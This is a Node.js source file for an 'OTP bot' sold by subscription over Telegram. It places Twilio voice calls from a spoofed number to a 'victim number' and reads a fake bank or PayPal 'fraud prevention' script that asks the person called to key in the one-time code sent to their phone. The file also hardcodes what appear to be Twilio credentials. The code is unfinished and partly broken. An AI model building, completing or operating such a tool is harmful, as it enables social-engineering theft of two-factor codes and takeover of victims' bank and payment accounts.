const express = require('express');
const app = express();
require('dotenv').config()

// TWILIO STUFF
const voiceResponse = require('twilio').twiml.VoiceResponse;
const accountSid = 'ACeb83ade914d0f61e2e2073cfa811574c';
const authToken = '1cee84912ce87e9ba3d145edcda4a1ba';
const client = require('twilio')(accountSid, authToken)


// BOT STUFF
const { Telegraf } = require('telegraf'); // importing telegraf.js
const bot_token = process.env.BOT_TOKEN
var bot = new Telegraf(bot_token)


const port = process.env.PORT || 3000;
const serviceList = [ 'paypal', 'venmo', 'boa', 'chase', 'bank', 'cashapp' ]


var sqlite3 = require('sqlite3');
var db = new sqlite3.Database('db.sqlite3');

var table = `CREATE TABLE IF NOT EXISTS entries (
   user_key TEXT PRIMARY KEY,
   user TEXT NOT NULL,
   duration INTEGER NOT NULL
)`;

db.run( table, [], function(err) {
   if (err) {
     console.error(err.message);
   } else {
     console.log('Table created successfully');
   }
});


// Define a function to insert a new entry into the table
function insertEntry(user_key, user, duration, ctx) {
   var sql = `INSERT INTO entries (user_key, user, duration) VALUES (?, ?, ?)`;
   var params = [user_key, user, duration];
 
   db.run(sql, params, function(err) {
     if (err) {
         console.error(err.message);
     } else {
         bot.telegram.sendMessage(ctx.chat.id, `your generted key is - ${user_key} for ${duration}`)
     }
   });
}

function updateEntry(user_key, user, ctx) {
   var sql = `UPDATE entries SET user = ? WHERE user_key = ?`;
   var params = [user, user_key];
 
   db.run(sql, params, function(err) {
     if (err) {
       console.error(err.message);
     } else {
         bot.telegram.sendMessage(ctx.chat.id, `welcome to OFBTC OTP BOT. Type /checktime to see how long you have left`)
     }
   });
}

function allowedUser(user_key) {
   var sql = `SELECT * FROM entries WHERE user_key = ?`;
   var params = [user_key];
   var result;

   db.get(sql, params, function(err, row) {
     if (err) {
       console.error(err.message);
     } else {
       if (row) {
         result = true;
       } else {
         result = false
      }
     }
   });

   return result
}


// Defined a list of allowed users (using IDs) 
const adminUsers = ['2020524303', '0']

// Defined a middleware function that checks the user 
const userFilter = (ctx, next) => {
   // Get the user from the context 
   const user = ctx.from.id 
   console.log(user, adminUsers[0])
   if ( allowedUser(user) || adminUsers.includes(`${user}`) ) {
      return next() 
   } else { 
      bot.telegram.sendMessage(ctx.chat.id, `❌ Error  : Restricted command, Purchase key`, {}).then(() => {})
      return null
   } 
}

const adminFilter = (ctx, next) => {
   // Get the user from the context 
   const user = ctx.from.id
   if (adminUsers.includes(user)) {
      return next() 
   } else { 
      return null 
   } 
}

async function call (spoof, customer_number, ctx, service, name, digit){
   try {
      await client.calls.create({
         to: `+19085874874`,
         from: `+19065534340`,
         machineDetection: 'DetectMessageEnd',
         url: 'https://demo.twilio.com/docs/voice/quickstart/voice.xml',
         statusCallback: '/'
      }); 

      await bot.telegram.sendMessage(ctx.chat.id, `📞 Call has Started...`, {
         reply_markup:{
            inline_keyboard: [
               [
                  {
                     text: 'End Call',
                     callback_data: 'end'
                  }               
               ]
            ]
         }
      }) 

   } catch (error) {
      console.log("your error is: ", error.message)
   }

}

// BOT INITIALIZATION
bot.on('start', ctx => {
   console.log(ctx.from)
   bot.telegram.sendMessage(
      ctx.chat.id, `
      𝕆𝔽𝔹𝕋ℂ 𝕆𝕋ℙ 𝔹𝕆𝕋! \n 
      ➤ Type: /purchase to subscribe \n 
      👤 USER COMMANDS 👤 \n
      ➤ /redeem - Redeem your key\n
      ➤ /checktime - Check subscription time left\n\n
      📞 CALL COMMANDS 📞 \n 
      ➤ /call - Capture OTP (Paypal, Venmo, cashapp...)\n
      ➤ /bank - Capture bank OTP\n
      ➤ /boa - Capture boa OTP\n
      ➤ /chase - Capture chase OTP\n
      ➤ /wellsfargo - Capture Wells fargo OTP\n
      ➤ /venmo - Capture venmo OTP\n
      ➤ /paypal - Capture bank OTP\n      
      `, {})
})

bot.help(ctx => ctx.reply(`
   𝕆𝔽𝔹𝕋ℂ 𝕆𝕋ℙ 𝔹𝕆𝕋! \n 
➤ Type: /purchase to subscribe \n 
👤 USER COMMANDS 👤 \n
➤ /redeem - Redeem your key\n
➤ /checktime - Check subscription time left\n\n
📞 CALL COMMANDS 📞 \n 
➤ /call - Capture OTP (Paypal, Venmo, cashapp...)\n
➤ /bank - Capture bank OTP\n
➤ /boa - Capture boa OTP\n
➤ /chase - Capture chase OTP\n
➤ /wellsfargo - Capture Wells fargo OTP\n
➤ /venmo - Capture venmo OTP\n
➤ /paypal - Capture bank OTP\n
`))


// ADMIN COMMANDS
bot.command('new_key', adminFilter, ctx => {
   const [key, duration] = ctx.message.text.split(' ');
   let newKey = Math.floor(Math.random())* 9999
   insertEntry( newKey, '', duration, ctx)
})


//  USER COMMANDS
bot.command('auth_key', ctx => {
   const [auth, key] = ctx.message.text.split(' ');
   updateEntry(key, ctx.from.id, ctx)
})

bot.command('redeem', ctx => {
   const [auth, key] = ctx.message.text.split(' ');
   updateEntry(key, ctx.from.id, ctx)
})

bot.command('checktime', ctx => {
   let duration = ''
   //TODO - check DATABASE duration'
   bot.telegram.sendMessage(ctx.chat.id, `you have left ${duration} left`)
})


// USER RESTRICTED COMMANDS
bot.command('call', userFilter, ctx => {
   const [command, spoof, number, service, name, digit ] = ctx.message.text.split(' ');
   const serviceList = [ 'paypal', 'venmo', 'boa', 'chase', 'bank', 'cashapp' ]

   if( !number || !serviceList.includes(service) ){
      bot.telegram.sendMessage(ctx.chat.id, `❌ Error  : Invalid number or service not available`, {}).then(() => {})
   }
   else{
      bot.telegram.sendMessage(ctx.chat.id, 
         `
✅ CALL STARTING\n 
✅ SPOOF NUBER - ${spoof}\n 
✅ VICTIM NUBER - ${number}\n 
✅ SERIVCE - ${service}\n
✅ OTP DIGIT - ${digit} 
         `, {})

      call(spoof, number, ctx, service, name, 6)
   }


})

bot.command('paypal', userFilter, ctx => {
   const [command, spoof, number, name, digit ]= ctx.message.text.split(' ');

   if( !number || !serviceList.includes(command) ){
      bot.telegram.sendMessage(ctx.chat.id, `❌ Error  : Invalid number or service not available`, {}).then(() => {})
   }
   else{
      bot.telegram.sendMessage(ctx.chat.id, 
         `
✅ CALL STARTING\n 
✅ SPOOF NUBER - ${spoof}\n 
✅ VICTIM NUBER - ${number}\n 
✅ SERIVCE - ${command}\n
✅ OTP DIGIT - ${digit} 
         `, {})

      call(spoof, number, ctx, command, name, 6)
   }


})

bot.command('venmo', userFilter, ctx => {
   const [command, spoof, number, name, digit ]= ctx.message.text.split(' ');

   if( !number || !serviceList.includes(command) ){
      bot.telegram.sendMessage(ctx.chat.id, `❌ Error  : Invalid number or service not available`, {}).then(() => {})
   }
   else{
      bot.telegram.sendMessage(ctx.chat.id, 
         `
✅ CALL STARTING\n 
✅ SPOOF NUBER - ${spoof}\n 
✅ VICTIM NUBER - ${number}\n 
✅ SERIVCE - ${command}\n
✅ OTP DIGIT - ${digit} 
         `, {})

      call(spoof, number, ctx, command, name, 6)
   }


})

bot.command('boa', userFilter, ctx => {
   const [command, spoof, number, name, digit ]= ctx.message.text.split(' ');

   if( !number || !serviceList.includes(command) ){
      bot.telegram.sendMessage(ctx.chat.id, `❌ Error  : Invalid number or service not available`, {}).then(() => {})
   }
   else{
      bot.telegram.sendMessage(ctx.chat.id, 
         `
✅ CALL STARTING\n 
✅ SPOOF NUBER - ${spoof}\n 
✅ VICTIM NUBER - ${number}\n 
✅ SERIVCE - ${command}\n
✅ OTP DIGIT - ${digit} 
         `, {})

      call(spoof, number, ctx, command, name, 6)
   }


})

bot.command('chase', userFilter, ctx => {
   const [command, spoof, number, name, digit ]= ctx.message.text.split(' ');

   if( !number || !serviceList.includes(command) ){
      bot.telegram.sendMessage(ctx.chat.id, `❌ Error  : Invalid number or service not available`, {}).then(() => {})
   }
   else{
      bot.telegram.sendMessage(ctx.chat.id, 
         `
✅ CALL STARTING\n 
✅ SPOOF NUBER - ${spoof}\n 
✅ VICTIM NUBER - ${number}\n 
✅ SERIVCE - ${command}\n
✅ OTP DIGIT - ${digit} 
         `, {})

      call(spoof, number, ctx, command, name, 6)
   }


})

bot.command('cashapp', userFilter, ctx => {
   const [command, spoof, number, name, digit ]= ctx.message.text.split(' ');

   if( !number || !serviceList.includes(command) ){
      bot.telegram.sendMessage(ctx.chat.id, `❌ Error  : Invalid number or service not available`, {}).then(() => {})
   }
   else{
      bot.telegram.sendMessage(ctx.chat.id, 
         `
✅ CALL STARTING\n 
✅ SPOOF NUBER - ${spoof}\n 
✅ VICTIM NUBER - ${number}\n 
✅ SERIVCE - ${command}\n
✅ OTP DIGIT - ${digit} 
         `, {})

      call(spoof, number, ctx, command, name, 6)
   }


})

bot.command('bank', userFilter, ctx => {
   const [command, spoof, number, name, digit ]= ctx.message.text.split(' ');

   if( !number || !serviceList.includes(command) ){
      bot.telegram.sendMessage(ctx.chat.id, `❌ Error  : Invalid number or service not available`, {}).then(() => {})
   }
   else{
      bot.telegram.sendMessage(ctx.chat.id, 
         `
✅ CALL STARTING\n 
✅ SPOOF NUBER - ${spoof}\n 
✅ VICTIM NUBER - ${number}\n 
✅ SERIVCE - ${command}\n
✅ OTP DIGIT - ${digit} 
         `, {})

      call(spoof, number, ctx, command, name, 6)
   }


})

bot.launch();


// webhook urls
app.get('/', (req, res) => {
   // Create TwiML response
   const twiml = new voiceResponse();

   twiml.say(`Hello ${ 1 }, this is ${ 2 } fraud prevention line. We have sent an automated call because of an attempt to change the password on your ${2}'s account. If this was not you, press one. `);

     // Use the <Gather> verb to collect user input
   twiml.gather({
      numDigits: 1, // The number of digits to collect
      timeout: 10, // The number of seconds to wait for input
      action: '/process' // The URL to redirect to after input
   });

   // Send the TwiML response as XML
   res.type('text/xml');
   res.send(twiml.toString());
});

app.get('/process', (req, res) => {
  // Get the input digit from the request
  const digit = req.body.Digits;

  // Create a TwiML response object
  const twiml = new twilio.twiml.VoiceResponse();

  // Check the input digit and respond accordingly
  switch (digit) {
   case '1':
     // Say thank you and hang up
      twiml.say( `To block this request, please enter the ${6} digit code that we have sent to your mobile device.` );
      twiml.gather({
         numDigits: 6, // The number of digits to collect
         timeout: 10, // The number of seconds to wait for input
         action: '/otp' // The URL to redirect to after input
      });
     break;
   default:
     // Say invalid and redirect to the original URL
     twiml.say('Invalid input. Please try again.');
     twiml.redirect(url);
     break;
   }

   twiml.say(``);

     // Use the <Gather> verb to collect user input

});

app.get('/otp', (req, res) => {
   // Get the input digit from the request
   const digit = req.body.Digits;
 
   // Create a TwiML response object
   const twiml = new twilio.twiml.VoiceResponse();
 
 });

app.listen(port, () => {
   console.log(`Server running on port ${port}`);
});
 

